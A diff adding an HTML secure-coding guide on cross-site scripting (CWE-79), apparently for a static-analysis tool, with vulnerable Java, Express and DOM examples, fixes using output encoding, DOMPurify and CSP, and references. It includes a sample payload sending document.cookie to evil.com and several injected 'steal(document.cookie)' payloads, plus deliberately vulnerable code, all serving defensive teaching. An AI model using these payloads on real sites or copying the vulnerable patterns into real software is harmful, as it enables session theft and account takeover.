@@ -1,0 +1,458 @@
+<!-- Overview -->
+<div class="mb-8">
+    <h3 class="text-xl font-semibold text-blue-300 mb-3">Why Is This an Issue?</h3>
+    <p class="text-gray-300 leading-relaxed mb-4">
+        CWE-79 covers <strong class="text-gray-200">Cross-Site Scripting (XSS)</strong> — a class of
+        vulnerabilities where <strong class="text-gray-200">user-controlled input is rendered into a web
+            page without proper sanitization or encoding</strong>, allowing an attacker to inject
+        <code class="bg-gray-800 px-1.5 py-0.5 rounded text-red-400">&lt;script&gt;</code> tags,
+        event handlers, or other executable markup. SAST tools may report this under various names
+        such as <em>"JavaScript Enabled"</em>, <em>"XSS"</em>, or <em>"Improper Neutralization of
+            Input During Web Page Generation"</em>.
+    </p>
+    <p class="text-gray-300 leading-relaxed mb-4">
+        XSS is consistently one of the most prevalent and dangerous web vulnerabilities. It enables:
+    </p>
+    <ul class="list-disc list-inside text-gray-300 leading-relaxed mb-4 space-y-1 ml-2">
+        <li><strong class="text-gray-200">Session hijacking</strong> — stealing cookies and session tokens
+            via <code class="text-red-400">document.cookie</code></li>
+        <li><strong class="text-gray-200">Credential theft</strong> — injecting fake login forms or keyloggers</li>
+        <li><strong class="text-gray-200">Account takeover</strong> — performing actions as the victim user</li>
+        <li><strong class="text-gray-200">Malware distribution</strong> — redirecting users to malicious sites</li>
+        <li><strong class="text-gray-200">Data exfiltration</strong> — reading page content and sending it
+            to attacker-controlled servers</li>
+    </ul>
+    <p class="text-gray-300 leading-relaxed mb-4">
+        There are three main types of XSS:
+    </p>
+    <div class="grid sm:grid-cols-3 gap-3 mb-4">
+        <div class="bg-gray-900 p-3 rounded-lg border border-gray-800">
+            <p class="text-sm font-semibold text-red-400 mb-1">Reflected XSS</p>
+            <p class="text-gray-400 text-xs">Malicious input is immediately reflected back in the HTTP
+                response (e.g., search queries, error messages). Requires the victim to click a crafted link.</p>
+        </div>
+        <div class="bg-gray-900 p-3 rounded-lg border border-gray-800">
+            <p class="text-sm font-semibold text-red-400 mb-1">Stored XSS</p>
+            <p class="text-gray-400 text-xs">Malicious input is persisted (database, file) and served to all
+                users who view the content. Most dangerous — no victim interaction needed beyond viewing the page.</p>
+        </div>
+        <div class="bg-gray-900 p-3 rounded-lg border border-gray-800">
+            <p class="text-sm font-semibold text-red-400 mb-1">DOM-based XSS</p>
+            <p class="text-gray-400 text-xs">Payload never reaches the server — client-side JavaScript reads
+                from a source (URL, postMessage) and writes to a dangerous sink (innerHTML, eval).</p>
+        </div>
+    </div>
+    <p class="text-gray-300 leading-relaxed">
+        This weakness is part of <strong class="text-gray-200">OWASP A03:2021 — Injection</strong> and
+        appears in the <strong class="text-gray-200">SANS/CWE Top 25</strong>. The primary defense is
+        <strong class="text-gray-200">context-aware output encoding</strong> — HTML-encoding for HTML body,
+        JavaScript-encoding for script contexts, URL-encoding for href attributes — combined with
+        Content Security Policy (CSP) as a defense-in-depth layer.
+    </p>
+</div>
+
+<!-- Vulnerable Examples -->
+<div class="mb-8">
+    <h3 class="text-xl font-semibold text-blue-300 mb-4">Examples of the Issue</h3>
+    <div class="space-y-6">
+
+        <!-- Example 1: Java JSP reflected XSS -->
+        <div class="bg-gray-900 p-5 rounded-xl border border-gray-800">
+            <h4 class="font-semibold text-red-400 mb-2 flex items-center">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2">
+                    <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z" />
+                    <path d="M12 9v4" />
+                    <path d="M12 17h.01" />
+                </svg>
+                Dangerous: Reflected XSS via unescaped request parameters (Java / JSP / Servlet)
+            </h4>
+            <p class="text-gray-400 text-sm mb-3">
+                Directly embedding <code class="text-red-400">request.getParameter()</code> into HTML output
+                without encoding is the classic reflected XSS pattern. An attacker crafts a URL like
+                <code
+                    class="text-gray-300 text-xs">?query=&lt;script&gt;document.location='https://evil.com/?c='+document.cookie&lt;/script&gt;</code>
+                and tricks the victim into clicking it. The server echoes the script back, and the browser
+                executes it in the context of the vulnerable application.
+            </p>
+            <div class="code-block mt-2"><button class="copy-btn">Copy</button><code>// DANGEROUS: User input rendered directly into HTML — reflected XSS.
+
+// --- JSP (search results page) ---
+&lt;h2&gt;Search results for: &lt;%= request.getParameter("query") %&gt;&lt;/h2&gt;
+&lt;!-- Attacker input: &lt;script&gt;steal(document.cookie)&lt;/script&gt; --&gt;
+
+// --- Servlet ---
+@WebServlet("/search")
+public class SearchServlet extends HttpServlet {
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
+            throws IOException {
+        String query = req.getParameter("query");
+
+        resp.setContentType("text/html");
+        PrintWriter out = resp.getWriter();
+        // User input injected directly into HTML — no encoding.
+        out.println("&lt;h2&gt;Results for: " + query + "&lt;/h2&gt;");
+        //                                    ↑ XSS sink
+    }
+}
+
+// --- Thymeleaf (th:utext disables encoding) ---
+&lt;p th:utext="${userComment}"&gt;&lt;/p&gt;
+&lt;!-- th:utext = "unescaped text" — renders raw HTML including scripts --&gt;</code></div>
+        </div>
+
+        <!-- Example 2: Node.js / Express stored XSS -->
+        <div class="bg-gray-900 p-5 rounded-xl border border-gray-800">
+            <h4 class="font-semibold text-red-400 mb-2 flex items-center">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2">
+                    <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z" />
+                    <path d="M12 9v4" />
+                    <path d="M12 17h.01" />
+                </svg>
+                Dangerous: Stored XSS and Reflected XSS in Express / Node.js
+            </h4>
+            <p class="text-gray-400 text-sm mb-3">
+                Using <code class="text-red-400">res.send()</code> to render user input directly into HTML,
+                or using template engines with unescaped output (<code class="text-red-400">{{{}}}</code> in
+                Handlebars, <code class="text-red-400"><%- %></code> in EJS), allows stored and reflected
+                XSS. Stored XSS is especially dangerous — the payload is saved to the database and served
+                to every user who views the page.
+            </p>
+            <div class="code-block mt-2"><button class="copy-btn">Copy</button><code>// DANGEROUS: User input interpolated directly into HTML response.
+const express = require('express');
+const app = express();
+
+// Reflected XSS — query param rendered without encoding.
+app.get('/search', (req, res) => {
+    const query = req.query.q;
+    // Direct string interpolation into HTML = XSS.
+    res.send(`&lt;h1&gt;Results for: ${query}&lt;/h1&gt;`);
+});
+
+// Stored XSS — user comment saved to DB, rendered to all visitors.
+app.get('/post/:id', async (req, res) => {
+    const post = await db.getPost(req.params.id);
+    const comments = await db.getComments(req.params.id);
+
+    let html = `&lt;h1&gt;${post.title}&lt;/h1&gt;`;
+    comments.forEach(c => {
+        // Attacker's comment: &lt;img src=x onerror="steal(document.cookie)"&gt;
+        html += `&lt;div class="comment"&gt;${c.body}&lt;/div&gt;`;
+    });
+    res.send(html);
+});
+
+// EJS template with unescaped output:
+// &lt;%= userInput %&gt;   ← SAFE (auto-encodes)
+// &lt;%- userInput %&gt;   ← DANGEROUS (raw HTML)
+
+// Handlebars with unescaped output:
+// {{userInput}}    ← SAFE (auto-encodes)
+// {{{userInput}}}  ← DANGEROUS (raw HTML)</code></div>
+        </div>
+
+        <!-- Example 3: DOM-based XSS in client-side JavaScript -->
+        <div class="bg-gray-900 p-5 rounded-xl border border-gray-800">
+            <h4 class="font-semibold text-red-400 mb-2 flex items-center">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2">
+                    <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z" />
+                    <path d="M12 9v4" />
+                    <path d="M12 17h.01" />
+                </svg>
+                Dangerous: DOM-based XSS via innerHTML, eval, and document.write (Client-Side JavaScript)
+            </h4>
+            <p class="text-gray-400 text-sm mb-3">
+                DOM-based XSS happens entirely in the browser — the server never sees the payload. Client-side
+                JavaScript reads from a <strong class="text-gray-200">source</strong> (URL hash, query params,
+                <code class="text-red-400">postMessage</code>, <code class="text-red-400">localStorage</code>)
+                and writes to a <strong class="text-gray-200">dangerous sink</strong>
+                (<code class="text-red-400">innerHTML</code>, <code class="text-red-400">eval()</code>,
+                <code class="text-red-400">document.write()</code>). SAST tools flag these source-to-sink
+                flows as DOM-based XSS.
+            </p>
+            <div class="code-block mt-2"><button class="copy-btn">Copy</button><code>// DANGEROUS: DOM-based XSS — payload from URL rendered via innerHTML.
+
+// Source: URL hash → Sink: innerHTML
+const section = window.location.hash.substring(1);
+document.getElementById('content').innerHTML = section;
+// URL: page.html#&lt;img src=x onerror=alert(document.cookie)&gt;
+
+// Source: URL query param → Sink: innerHTML
+const params = new URLSearchParams(window.location.search);
+document.getElementById('greeting').innerHTML =
+    'Welcome, ' + params.get('name');
+// URL: page.html?name=&lt;script&gt;steal()&lt;/script&gt;
+
+// Source: postMessage → Sink: innerHTML (no origin check)
+window.addEventListener('message', (event) => {
+    // No origin validation — any window can send malicious HTML.
+    document.getElementById('widget').innerHTML = event.data;
+});
+
+// Other dangerous sinks:
+eval(userInput);                           // Code execution
+document.write(userInput);                 // HTML injection
+element.setAttribute('onclick', userInput); // Event handler injection
+element.insertAdjacentHTML('beforeend', userInput); // HTML injection
+new Function(userInput)();                 // Code execution
+setTimeout(userInput, 0);                  // Code execution (string form)</code></div>
+        </div>
+    </div>
+</div>
+
+<!-- Remediation -->
+<div class="mb-8">
+    <h3 class="text-xl font-semibold text-blue-300 mb-4">How to Resolve</h3>
+    <div class="space-y-6">
+
+        <!-- Fix 1: Java context-aware output encoding -->
+        <div class="bg-gray-900 p-5 rounded-xl border border-green-900/50">
+            <h4 class="font-semibold text-green-400 mb-2 flex items-center">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2">
+                    <path d="M20 6 9 17l-5-5" />
+                </svg>
+                Fix (Java): Context-aware output encoding with OWASP Java Encoder
+            </h4>
+            <p class="text-gray-400 text-sm mb-3">
+                Use the <code class="text-green-400">OWASP Java Encoder</code> library for context-aware
+                encoding. The correct encoder depends on <em>where</em> the data appears in the HTML:
+                <code class="text-green-400">forHtml()</code> for body text,
+                <code class="text-green-400">forHtmlAttribute()</code> for attributes,
+                <code class="text-green-400">forJavaScript()</code> for inline scripts, and
+                <code class="text-green-400">forUriComponent()</code> for URLs.
+                In Thymeleaf, always use <code class="text-green-400">th:text</code> instead of
+                <code class="text-red-400">th:utext</code>.
+            </p>
+            <div class="code-block mt-2"><button class="copy-btn">Copy</button><code>// SAFE: Context-aware encoding prevents XSS in all output contexts.
+// Add dependency: org.owasp.encoder:encoder:1.3.1
+
+import org.owasp.encoder.Encode;
+
+// --- Servlet: HTML body context ---
+String query = req.getParameter("query");
+out.println("&lt;h2&gt;Results for: " + Encode.forHtml(query) + "&lt;/h2&gt;");
+// &lt;script&gt; becomes &amp;lt;script&amp;gt; — rendered as text, not code.
+
+// --- HTML attribute context ---
+out.println("&lt;input value=\"" + Encode.forHtmlAttribute(query) + "\"&gt;");
+
+// --- JavaScript string context ---
+out.println("&lt;script&gt;var q = '" + Encode.forJavaScript(query) + "';&lt;/script&gt;");
+
+// --- URL parameter context ---
+out.println("&lt;a href=\"/search?q=" + Encode.forUriComponent(query) + "\"&gt;");
+
+// --- JSP: use JSTL c:out or fn:escapeXml ---
+// SAFE: &lt;c:out value="${param.query}" /&gt;
+// SAFE: ${fn:escapeXml(param.query)}
+// DANGEROUS: ${param.query}  ← No encoding!
+
+// --- Thymeleaf: always use th:text (encodes), never th:utext (raw) ---
+// SAFE:      &lt;p th:text="${userComment}"&gt;&lt;/p&gt;
+// DANGEROUS: &lt;p th:utext="${userComment}"&gt;&lt;/p&gt;</code></div>
+        </div>
+
+        <!-- Fix 2: Node.js/Express safe templating + DOMPurify -->
+        <div class="bg-gray-900 p-5 rounded-xl border border-green-900/50">
+            <h4 class="font-semibold text-green-400 mb-2 flex items-center">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2">
+                    <path d="M20 6 9 17l-5-5" />
+                </svg>
+                Fix (JS): Auto-encoding templates, DOMPurify for rich content, textContent for DOM
+            </h4>
+            <p class="text-gray-400 text-sm mb-3">
+                Use template engines with <strong class="text-green-300">auto-encoding enabled by default</strong>
+                (<code class="text-green-400">&lt;%= %&gt;</code> in EJS,
+                <code class="text-green-400">{{}}</code> in Handlebars). When you must render user-supplied
+                HTML (e.g., rich text editors), sanitize it with
+                <code class="text-green-400">DOMPurify</code> on the server side. For client-side DOM
+                manipulation, use <code class="text-green-400">textContent</code> instead of
+                <code class="text-red-400">innerHTML</code>.
+            </p>
+            <div class="code-block mt-2"><button class="copy-btn">Copy</button><code>// SAFE: Multiple defense layers for Node.js / Express.
+const express = require('express');
+const createDOMPurify = require('dompurify');
+const { JSDOM } = require('jsdom');
+
+const DOMPurify = createDOMPurify(new JSDOM('').window);
+
+const app = express();
+app.set('view engine', 'ejs');
+
+// 1. Use auto-encoding template tags.
+// EJS: &lt;%= userInput %&gt; auto-encodes HTML entities.
+app.get('/search', (req, res) => {
+    res.render('search', { query: req.query.q });
+    // In search.ejs: &lt;h1&gt;Results for: &lt;%= query %&gt;&lt;/h1&gt;
+    //                          ↑ Auto-encoded — XSS blocked.
+});
+
+// 2. When raw HTML is needed (rich text), sanitize with DOMPurify.
+app.post('/comment', async (req, res) => {
+    const safeHtml = DOMPurify.sanitize(req.body.comment, {
+        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'li'],
+        ALLOWED_ATTR: ['href']
+    });
+    // Strips &lt;script&gt;, onerror, onclick, etc. — only safe tags remain.
+    await db.saveComment(req.params.id, safeHtml);
+    res.redirect('back');
+});
+
+// 3. Client-side: use textContent, NEVER innerHTML for user data.
+// SAFE:
+document.getElementById('name').textContent = userName;
+// DANGEROUS:
+// document.getElementById('name').innerHTML = userName;</code></div>
+        </div>
+
+        <!-- Fix 3: Content Security Policy + framework-level protections -->
+        <div class="bg-gray-900 p-5 rounded-xl border border-green-900/50">
+            <h4 class="font-semibold text-green-400 mb-2 flex items-center">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2">
+                    <path d="M20 6 9 17l-5-5" />
+                </svg>
+                Defense-in-Depth: Content Security Policy (CSP) and framework protections
+            </h4>
+            <p class="text-gray-400 text-sm mb-3">
+                Output encoding is the primary defense, but <code class="text-green-400">Content-Security-Policy</code>
+                (CSP) provides a critical second layer. A strict CSP blocks inline script execution even if
+                encoding is missed. Modern frameworks (React, Angular, Vue) auto-encode by default — but
+                they all have escape hatches
+                (<code class="text-red-400">dangerouslySetInnerHTML</code>,
+                <code class="text-red-400">[innerHTML]</code>,
+                <code class="text-red-400">v-html</code>) that must be audited.
+            </p>
+            <div class="code-block mt-2"><button class="copy-btn">Copy</button><code>// SAFE: Strict CSP + Helmet middleware (Express/Node.js).
+const helmet = require('helmet');
+
+app.use(helmet.contentSecurityPolicy({
+    directives: {
+        defaultSrc: ["'self'"],
+        scriptSrc: ["'self'"],          // No 'unsafe-inline'!
+        styleSrc: ["'self'", "'unsafe-inline'"],
+        imgSrc: ["'self'", "data:", "https:"],
+        connectSrc: ["'self'"],
+        // Blocks: inline &lt;script&gt;, eval(), javascript: URIs.
+    }
+}));
+
+// Java (Spring Security) — strict CSP header:
+// http.headers(h -> h.contentSecurityPolicy(csp ->
+//     csp.policyDirectives("default-src 'self'; script-src 'self'")
+// ));
+
+// ─── Framework escape hatches to audit ───
+// React:  dangerouslySetInnerHTML={{__html: userInput}}  ← AUDIT
+// Angular: [innerHTML]="userInput"                       ← AUDIT (auto-sanitized)
+// Vue:     v-html="userInput"                            ← AUDIT (not sanitized!)
+
+// React safe pattern (default behavior):
+// const SearchResult = ({ query }) =&gt; (
+//   &lt;h1&gt;Results for: {query}&lt;/h1&gt;  // Auto-encoded by JSX
+// );
+
+// Additional headers for defense-in-depth:
+// X-Content-Type-Options: nosniff     — prevents MIME sniffing
+// X-Frame-Options: DENY               — prevents clickjacking
+// Referrer-Policy: strict-origin      — limits referrer leakage</code></div>
+        </div>
+    </div>
+</div>
+
+<!-- References -->
+<div>
+    <h3 class="text-xl font-semibold text-blue-300 mb-4">References</h3>
+    <div class="grid sm:grid-cols-2 gap-3">
+        <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener noreferrer"
+            class="flex items-center bg-gray-900 p-4 rounded-lg border border-gray-800 hover:border-blue-600 transition group">
+            <span class="text-blue-400 mr-3 group-hover:text-blue-300 transition">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" />
+                    <polyline points="15 3 21 3 21 9" />
+                    <line x1="10" x2="21" y1="14" y2="3" />
+                </svg>
+            </span>
+            <div>
+                <p class="text-sm font-semibold text-gray-200 group-hover:text-white transition">PortSwigger —
+                    Cross-Site Scripting (XSS)</p>
+                <p class="text-xs text-gray-500">Comprehensive explanation and interactive labs for XSS vulnerabilities
+                </p>
+            </div>
+        </a>
+
+        <a href="https://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noopener noreferrer"
+            class="flex items-center bg-gray-900 p-4 rounded-lg border border-gray-800 hover:border-blue-600 transition group">
+            <span class="text-blue-400 mr-3 group-hover:text-blue-300 transition">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" />
+                    <polyline points="15 3 21 3 21 9" />
+                    <line x1="10" x2="21" y1="14" y2="3" />
+                </svg>
+            </span>
+            <div>
+                <p class="text-sm font-semibold text-gray-200 group-hover:text-white transition">MITRE CWE-79</p>
+                <p class="text-xs text-gray-500">Improper Neutralization of Input During Web Page Generation (XSS)</p>
+            </div>
+        </a>
+
+        <a href="https://owasp.org/Top10/A03_2021-Injection/" target="_blank" rel="noopener noreferrer"
+            class="flex items-center bg-gray-900 p-4 rounded-lg border border-gray-800 hover:border-blue-600 transition group">
+            <span class="text-blue-400 mr-3 group-hover:text-blue-300 transition">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" />
+                    <polyline points="15 3 21 3 21 9" />
+                    <line x1="10" x2="21" y1="14" y2="3" />
+                </svg>
+            </span>
+            <div>
+                <p class="text-sm font-semibold text-gray-200 group-hover:text-white transition">OWASP A03:2021 —
+                    Injection</p>
+                <p class="text-xs text-gray-500">Top 10 category covering XSS and other injection flaws</p>
+            </div>
+        </a>
+
+        <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+            target="_blank" rel="noopener noreferrer"
+            class="flex items-center bg-gray-900 p-4 rounded-lg border border-gray-800 hover:border-blue-600 transition group">
+            <span class="text-blue-400 mr-3 group-hover:text-blue-300 transition">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" />
+                    <polyline points="15 3 21 3 21 9" />
+                    <line x1="10" x2="21" y1="14" y2="3" />
+                </svg>
+            </span>
+            <div>
+                <p class="text-sm font-semibold text-gray-200 group-hover:text-white transition">OWASP XSS
+                    Prevention Cheat Sheet</p>
+                <p class="text-xs text-gray-500">Context-aware encoding rules and defense strategies</p>
+            </div>
+        </a>
+
+        <a href="https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"
+            target="_blank" rel="noopener noreferrer"
+            class="flex items-center bg-gray-900 p-4 rounded-lg border border-gray-800 hover:border-blue-600 transition group">
+            <span class="text-blue-400 mr-3 group-hover:text-blue-300 transition">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" />
+                    <polyline points="15 3 21 3 21 9" />
+                    <line x1="10" x2="21" y1="14" y2="3" />
+                </svg>
+            </span>
+            <div>
+                <p class="text-sm font-semibold text-gray-200 group-hover:text-white transition">OWASP Content
+                    Security Policy Cheat Sheet</p>
+                <p class="text-xs text-gray-500">CSP directives for XSS mitigation and defense-in-depth</p>
+            </div>
+        </a>
+    </div>
+</div>
